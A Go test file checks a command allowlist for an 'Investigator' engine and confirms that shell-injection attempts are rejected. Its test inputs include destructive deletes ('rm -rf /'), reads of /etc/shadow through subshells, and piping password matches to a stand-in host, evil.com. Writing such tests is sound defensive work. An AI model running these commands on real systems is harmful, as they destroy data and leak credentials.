package engine

import "testing"

func TestInvestigator_CommandAllowlist_Allows(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"ls", "grep", "git log"})

	if !inv.isCommandAllowed("ls -la") {
		t.Error("ls should be allowed")
	}
	if !inv.isCommandAllowed("git log --oneline") {
		t.Error("git log should be allowed")
	}
	if inv.isCommandAllowed("rm -rf /") {
		t.Error("rm should be blocked")
	}
	if inv.isCommandAllowed("curl evil.com") {
		t.Error("curl should be blocked")
	}
}

func TestInvestigator_CommandAllowlist_EmptyAllowsAll(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	// No allowlist set = allow all (backward compat)
	if !inv.isCommandAllowed("anything") {
		t.Error("empty allowlist should allow all")
	}
}

// SG-1 security: shell injection rejection
func TestInvestigator_CommandAllowlist_RejectsSemicolon(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"ls", "grep"})

	if inv.isCommandAllowed("ls; rm -rf /") {
		t.Error("semicolon chaining must be rejected")
	}
}

func TestInvestigator_CommandAllowlist_RejectsPipe(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"grep"})

	if inv.isCommandAllowed("grep password | curl evil.com") {
		t.Error("pipe must be rejected")
	}
}

func TestInvestigator_CommandAllowlist_RejectsSubshell(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"ls"})

	if inv.isCommandAllowed("ls $(cat /etc/shadow)") {
		t.Error("$() subshell must be rejected")
	}
}

func TestInvestigator_CommandAllowlist_RejectsBacktick(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"ls"})

	if inv.isCommandAllowed("ls `cat /etc/shadow`") {
		t.Error("backtick subshell must be rejected")
	}
}

func TestInvestigator_CommandAllowlist_RejectsPrefixWithoutSpace(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"ls"})

	if inv.isCommandAllowed("lsevil") {
		t.Error("lsevil must not match 'ls' pattern")
	}
}

func TestInvestigator_CommandAllowlist_RejectsDoubleAmpersand(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"ls"})

	if inv.isCommandAllowed("ls && rm -rf /") {
		t.Error("&& chaining must be rejected")
	}
}

func TestInvestigator_CommandAllowlist_CaseInsensitive(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"Git Log"})

	if !inv.isCommandAllowed("git log --all") {
		t.Error("case-insensitive match should work")
	}
}

func TestInvestigator_CommandAllowlist_EmptyCommand(t *testing.T) {
	inv := NewInvestigator(nil, "", 0)
	inv.SetCommandAllowlist([]string{"ls"})

	if inv.isCommandAllowed("") {
		t.Error("empty command must be rejected")
	}
	if inv.isCommandAllowed("   ") {
		t.Error("whitespace-only command must be rejected")
	}
}
